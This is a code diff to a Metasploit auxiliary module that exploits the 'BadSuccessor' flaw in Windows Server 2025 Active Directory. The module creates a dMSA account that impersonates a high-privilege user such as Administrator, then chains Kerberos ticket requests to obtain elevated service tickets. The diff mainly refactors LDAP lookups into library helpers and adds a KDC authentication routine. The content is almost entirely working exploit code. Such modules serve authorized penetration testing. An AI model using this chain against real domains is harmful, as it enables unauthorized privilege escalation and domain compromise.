@@ -10,14 +10,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::OptionalSession::LDAP
   include Msf::Exploit::Remote::LDAP::ActiveDirectory
 
-  # LDAP_SERVER_SD_FLAGS constant definition, taken from https://ldapwiki.com/wiki/LDAP_SERVER_SD_FLAGS_OID
-  LDAP_SERVER_SD_FLAGS_OID = '1.2.840.113556.1.4.801'.freeze
-  OWNER_SECURITY_INFORMATION = 0x1
-  GROUP_SECURITY_INFORMATION = 0x2
-  DACL_SECURITY_INFORMATION = 0x4
-  SACL_SECURITY_INFORMATION = 0x8
-  GENERIC_ALL = 0x10000000
-
   def initialize(info = {})
     super(
       update_info(
@@ -49,17 +41,13 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://jorgequestforknowledge.wordpress.com/2025/09/02/from-badsuccessor-to-patchedsuccessor/'],
         ],
         'License' => MSF_LICENSE,
-        'Platform' => 'win',
         'Privileged' => true,
-        'Arch' => [ ARCH_X64 ],
-        'Targets' => [
-          ['Windows x64', { 'Arch' => ARCH_X64 }]
-        ],
         'DisclosureDate' => '2025-05-21',
         'Notes' => {
-          'Stability' => [ CRASH_SAFE, ],
-          'SideEffects' => [ ARTIFACTS_ON_DISK, ],
-          'Reliability' => [ REPEATABLE_SESSION, ]
+          'Stability' => [ CRASH_SAFE ],
+          'SideEffects' => [ ARTIFACTS_ON_DISK ],
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'AKA' => [ 'BadSuccessor' ]
         },
         'Actions' => [
           [ 'CREATE_DMSA', { 'Description' => 'Create a dMSA account which impersonates a high privilege user' } ],
@@ -71,21 +59,15 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       OptString.new('DMSA_ACCOUNT_NAME', [true, 'The name of the dMSA account to be create or request tickets for']),
       OptString.new('ACCOUNT_TO_IMPERSONATE', [true, 'The name of the dMSA account to be created', 'Administrator'], conditions: %w[ACTION == CREATE_DMSA]),
-      OptString.new('RHOSTNAME', [true, 'The fqdn of the domain controller']),
+      OptString.new('RHOSTNAME', [true, 'The hostname of the domain controller'], conditions: %w[ACTION == GET_TICKET]),
       OptString.new('SERVICE', [true, 'The Service you wish to get a high privilege ticket for', 'cifs'], conditions: %w[ACTION == GET_TICKET]),
     ])
+    deregister_options('SESSION')
   end
 
   def windows_version_vulnerable?
-    fqdn = datastore['RHOSTNAME']
-    filter = '(objectClass=domain)'
-    attributes = ['msds-behavior-version']
-    dc_functional_level = @ldap.search(base: @base_dn, filter: filter, attributes: attributes)
-
-    raise Net::LDAP::Error "Unable to retrieve Windows version information for #{fqdn}" if dc_functional_level.blank?
-
-    dc_functional_level = dc_functional_level.first
-    version = dc_functional_level['msds-behavior-version'].first
+    domain_info = adds_get_domain_info(@ldap)
+    version = domain_info[:domain_behavior_version]
 
     unless version.to_i == 10
       print_error('This module only works against domains running at the Windows 2025 functional level.')
@@ -180,7 +162,7 @@ class MetasploitModule < Msf::Auxiliary
       'cn' => [account_name],
       'useraccountcontrol' => ['4096'],
       'samaccountname' => [sam_account_name],
-      'dnshostname' => ['dontcare.com'],
+      'dnshostname' => ["#{Faker::Name.first_name}.#{datastore['LDAPDomain']}"],
       'msds-supportedencryptiontypes' => ['28'],
       'msds-managedpasswordinterval' => ['30'],
       'msds-groupmsamembership' => [group_membership],
@@ -210,11 +192,6 @@ class MetasploitModule < Msf::Auxiliary
     true
   end
 
-  def ms_security_descriptor_control(flags)
-    control_values = [flags].map(&:to_ber).to_ber_sequence.to_s.to_ber
-    [LDAP_SERVER_SD_FLAGS_OID.to_ber, control_values].to_ber_sequence
-  end
-
   def set_dmsa_attributes(dn, delegated_state, preceded_by_link)
     print_status("Setting attributes for dMSA object: #{dn}")
 
@@ -233,12 +210,9 @@ class MetasploitModule < Msf::Auxiliary
     print_good("Successfully updated attributes for dMSA object: #{dn}")
   end
 
-  def query_account(account_name, writeable_dn)
-    filter = Net::LDAP::Filter.eq('cn', account_name)
-    entry = nil
-    @ldap.search(base: writeable_dn, filter: filter) do |e|
-      entry = e
-    end
+  def query_account(account_name)
+    account_name = datastore['DMSA_ACCOUNT_NAME'] + '$' unless datastore['DMSA_ACCOUNT_NAME'].ends_with?('$')
+    entry = adds_get_object_by_samaccountname(@ldap, account_name)
 
     if entry.nil?
       print_error('Original object not found')
@@ -259,22 +233,6 @@ class MetasploitModule < Msf::Auxiliary
         print_status("#{key} => #{value.inspect}")
       end
     end
-  end
-
-  def query_user_info(ldap, base_dn, username)
-    filter = Net::LDAP::Filter.eq('sAMAccountName', username)
-    attributes = ['DN', 'objectSID', 'objectClass', 'primarygroupID']
-    entry = nil
-
-    ldap.search(base: base_dn, filter: filter, attributes: attributes) do |result|
-      entry = result
-    end
-
-    if entry.nil?
-      fail_with(Failure::NotFound, "User #{username} not found in LDAP directory.")
-    end
-
-    entry
   end
 
   def get_group_memebership(sid)
@@ -299,7 +257,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       @ldap = ldap
-      currrent_user_info = query_user_info(ldap, @base_dn, datastore['LDAPUsername'])
+      currrent_user_info = adds_get_object_by_samaccountname(ldap, datastore['LDAPUsername'])
       sid = Rex::Proto::MsDtyp::MsDtypSid.read(currrent_user_info[:objectsid].first)
 
       # Get vulnerable OUs
@@ -314,7 +272,7 @@ class MetasploitModule < Msf::Auxiliary
       create_dmsa(datastore['DMSA_ACCOUNT_NAME'], writeable_dn, get_group_memebership(sid).to_binary_s)
       fail_with(Failure::NoTarget, 'There are no Organization Units we can write to, the exploit can not continue') if ous.empty?
       set_dmsa_attributes("CN=#{datastore['DMSA_ACCOUNT_NAME']},#{writeable_dn}", '2', "CN=#{datastore['ACCOUNT_TO_IMPERSONATE']},CN=Users,#{@base_dn}")
-      query_account(datastore['DMSA_ACCOUNT_NAME'], writeable_dn)
+      query_account(datastore['DMSA_ACCOUNT_NAME'])
     end
   end
 
@@ -330,8 +288,8 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     ticket = mod.run_simple(
-      'LocalInput' => Rex::Ui::Text::Input::Stdio.new,
-      'LocalOutput' => Rex::Ui::Text::Output::Stdio.new
+      'LocalInput' => user_input,
+      'LocalOutput' => user_output
     )
 
     # Exceptions raised in the get_ticket won't propagate here, so fail if the ticket is nil
@@ -351,25 +309,12 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # First get a TGT for the attacker who created the dmsa account:
-    get_user_tgt_options = {
-      'DMSA' => false,
-      'DOMAIN' => datastore['LDAPDomain'],
-      'PASSWORD' => datastore['LDAPPassword'],
-      'rhosts' => datastore['RHOST'],
-      'username' => datastore['LDAPUsername'],
-      'SPN' => "krbtgt/#{datastore['LDAPDomain']}",
-      'action' => 'get_tgt',
-      'krb5ccname' => :unset,
-      'impersonate' => :unset,
-      'cert_file' => :unset
-    }
-
-    user_tgt = run_get_ticket_module(get_ticket_module, get_user_tgt_options)
+    user_tgt = auth_via_kdc
     print_good("Obtained TGT for the user #{datastore['LDAPUsername']}")
-    impersonate = datastore['DMSA_ACCOUNT_NAME'] + '$' unless datastore['DMSA_ACCOUNT_NAME'].ends_with?('$')
+
     # Secondly get a TGT for dMSA impersonating the target account:
+    impersonate = datastore['DMSA_ACCOUNT_NAME'] + '$' unless datastore['DMSA_ACCOUNT_NAME'].ends_with?('$')
     get_dmsa_tgs_options = {
-      'DMSA' => true,
       'DOMAIN' => datastore['LDAPDomain'],
       'PASSWORD' => datastore['LDAPPassword'],
       'rhosts' => datastore['RHOST'],
@@ -377,6 +322,7 @@ class MetasploitModule < Msf::Auxiliary
       'SPN' => "krbtgt/#{datastore['LDAPDomain']}",
       'action' => 'get_tgs',
       'IMPERSONATE' => impersonate,
+      'IMPERSONATE_TYPE' => 'dmsa',
       'krb5ccname' => user_tgt[:path]
     }
 
@@ -385,17 +331,35 @@ class MetasploitModule < Msf::Auxiliary
 
     # Lastly request the ticket for the desired service:
     get_priv_esc_tgs_options = {
-      'DMSA' => false,
       'username' => impersonate,
-      'SPN' => "#{datastore['SERVICE']}/#{datastore['RHOSTNAME']}",
+      'SPN' => "#{datastore['SERVICE']}/#{datastore['RHOSTNAME']}.#{datastore['LDAPDomain']}",
       'action' => 'get_tgs',
       'krb5ccname' => dmsa_tgs[:path],
       'PASSWORD' => :unset,
-      'IMPERSONATE' => :unset
+      'IMPERSONATE' => :unset,
+      'IMPERSONATE_TYPE' => 'none'
     }
 
     run_get_ticket_module(get_ticket_module, get_priv_esc_tgs_options)
     print_good("Obtained elevated TGT for #{datastore['DMSA_ACCOUNT_NAME']}")
+  end
+
+  def init_authenticator(options = {})
+    options.merge!({
+      host: rhost,
+      realm: datastore['LDAPDomain'],
+      username: datastore['LDAPUsername'],
+      password: datastore['LDAPPassword'],
+      framework: framework,
+      framework_module: self
+    })
+
+    Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(**options)
+  end
+
+  def auth_via_kdc
+    authenticator = init_authenticator({ ticket_storage: kerberos_ticket_storage(read: false, write: true) })
+    authenticator.authenticate_via_kdc(options)
   end
 
   def run
